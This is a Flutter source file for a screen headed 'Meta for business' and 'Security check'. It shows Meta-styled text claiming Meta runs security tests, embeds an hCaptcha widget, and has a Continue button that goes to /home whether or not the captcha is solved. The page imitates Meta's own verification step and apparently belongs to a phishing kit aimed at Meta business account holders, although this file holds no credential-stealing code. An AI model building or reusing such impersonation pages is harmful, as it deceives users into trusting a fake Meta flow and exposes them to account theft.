import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:gap/gap.dart';
import 'package:go_router/go_router.dart';
import 'package:webviewx/webviewx.dart';

class CapchaScreen extends StatefulWidget {
  const CapchaScreen({super.key});

  @override
  State<CapchaScreen> createState() => _CapchaScreenState();
}

class _CapchaScreenState extends State<CapchaScreen> {
  late WebViewXController webviewController;
  String html = """<html>
          <head>
            <title>hCaptcha</title>
            <script src="https://hcaptcha.com/1/api.js" async defer></script>
          </head>
          <body>
            <form action="?" method="POST">
              <div class="h-captcha"
              data-sitekey="a9d1967a-ff32-4b02-ad44-e75fa10cd99a"
              data-callback="captchaCallback"></div>
        
            </form>
            <script>
              function captchaCallback(response) {
              if (typeof Captcha!=="undefined") {
                Captcha.postMessage(response);
              }
              }
            </script>
          </body>
        </html>""";
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
          child: Container(
        width: 500,
        height: 620,
        decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.grey, width: 1)),
        child: Column(
          children: [
            Image.asset(
              "../assets/images/png/capchascreen.png",
              width: 500,
            ),
            Gap(12),
            const Text(
              "Meta for business",
              style: TextStyle(fontSize: 24),
            ),
            Gap(12),
            const Text(
              "Security check",
              style: TextStyle(fontSize: 24),
            ),
            Gap(12),
            const Text(
                style: TextStyle(
                  fontSize: 14,
                  color: Colors.black,
                ),
                """Meta uses security tests to ensure that the people on the site are real.
                Please fill the security check below to continue further."""),
            Gap(12),
            Center(
              child: WebViewX(
                initialContent: html, // Đổi URL của trang web bạn muốn hiển thị
                javascriptMode: JavascriptMode.unrestricted,
                initialSourceType: SourceType.html,
                onWebViewCreated: (controller) =>
                    webviewController = controller,
                width: 320,
                height: 90,
              ),
            ),
            Gap(16),
            GestureDetector(
                onTap: () {
                  context.pushReplacement("/home");
                },
                child: Container(
                    padding: EdgeInsets.all(12),
                    margin: EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(8),
                        color: Colors.blue),
                    width: double.infinity,
                    child: Center(
                        child: Text(
                      "Continue",
                      style: TextStyle(color: Colors.white, fontSize: 16),
                    ))))
          ],
        ),
      )),
    );
  }
}
